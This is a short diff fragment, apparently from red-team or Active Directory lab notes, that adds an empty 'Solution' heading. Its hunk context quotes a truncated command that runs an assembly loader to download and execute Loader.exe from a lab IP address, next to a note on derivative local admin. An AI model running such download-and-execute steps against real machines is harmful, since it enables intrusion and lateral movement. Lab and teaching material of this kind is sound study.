@@ -662,3 +662,5 @@ $ C:\Users\Public\AssemblyLoad.exe http://192.168.100.X/Loader.exe -path http://
 	- Using derivative local admin
 
 
+## **Solution**
+
